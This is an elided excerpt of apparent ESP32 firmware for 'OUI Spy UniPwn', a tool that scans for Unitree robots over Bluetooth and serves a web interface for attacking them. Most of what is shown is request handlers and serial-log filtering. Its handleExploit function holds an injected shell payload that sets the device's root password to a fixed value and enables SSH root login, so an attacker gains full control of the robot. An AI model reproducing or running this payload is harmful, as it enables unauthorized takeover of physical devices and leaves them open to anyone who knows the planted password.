...
void handleRoot() {
    ...
    // ASCII background disabled. You can re-enable by injecting getASCIIArt() into the background
    // div.
...
void handleScan() {
    ...
    String json = "{\"success\": true, \"continuous\": true, \"devices\": [], \"message\": "
...
void handleExploit() {
    ...
    Serial.println("[WEB] ├─ Command: " + command.substring(0, 50) +
                   (command.length() > 50 ? "..." : ""));
    ...
    if (command == "enable_ssh") {
        ...
        success = executeCommand(
            discoveredDevices[targetIndex],
            "echo 'root:Bin4ryWasHere'|chpasswd;sed -i 's/^#*\\s*PermitRootLogin.*/PermitRootLogin "
...
void handleStatus() {
    ...
    json +=
        "\"wifiStatus\":\"" + String(WiFi.getMode() == WIFI_AP ? "AP Mode" : "STA Mode") + "\",";
    json +=
        "\"bleStatus\":\"" + String(NimBLEDevice::getInitialized() ? "Active" : "Inactive") + "\",";
...
void handleHandshake() {
    ...
    int targetIndex = -1;
    for (int i = 0; i < discoveredDevices.size(); i++) {
        if (discoveredDevices[i].address.equals(addr)) {
            targetIndex = i;
            break;
        }
    }
    ...
    if (ok) {
        ...
        webServer.send(500, "application/json",
                       "{\"success\":false,\"error\":\"Handshake failed\"}");
    }
}
...
void mirrorSerialToWeb(const String& message) {
    ...
    if (message.indexOf("=== OUI Spy UniPwn Menu ===") != -1 ||
        message.indexOf("1. Use web app") != -1 || message.indexOf("2. Show recent") != -1 ||
        message.indexOf("3. Connect and") != -1 || message.indexOf("4. Toggle verbose") != -1 ||
        message.indexOf("5. Show attack") != -1 || message.indexOf("6. System information") != -1 ||
        message.indexOf("7. Web interface") != -1 || message.indexOf("8. Toggle buzzer") != -1 ||
        message.indexOf("9. Toggle LED") != -1 || message.indexOf("Enter choice:") != -1 ||
        message.indexOf("Available devices:") != -1 || message.indexOf("Select device") != -1) {
        return;
    }
    ...
    if (message.indexOf("TARGETS DISPLAYED:") != -1 ||
        ...
        message.indexOf("Button clicked for:") != -1 || message.indexOf("Device object:") != -1 ||
        message.indexOf("=== TARGET SELECTION ===") != -1 ||
        message.indexOf("selectDevice called with:") != -1 ||
        message.indexOf("Device name:") != -1 || message.indexOf("Device address:") != -1 ||
        message.indexOf("Device UUID:") != -1 || message.indexOf("selectedDevice set to:") != -1 ||
...
void notifyWebInterfaceNewTarget(const UnitreeDevice& device) {
    ...
    Serial.println("\n\033[1;95m[WEB] TARGET DETECTED: " + device.name + " [" + device.address +
                   "] (" + String(device.rssi) + "dBm)\033[0m");
...
void setupWebInterface() {
    ...
    webServer.on("/handshake", HTTP_POST, []() {
        ...
        int idx = -1;
        for (int i = 0; i < discoveredDevices.size(); i++) {
            if (discoveredDevices[i].address.equals(target)) {
                idx = i;
                break;
            }
        }
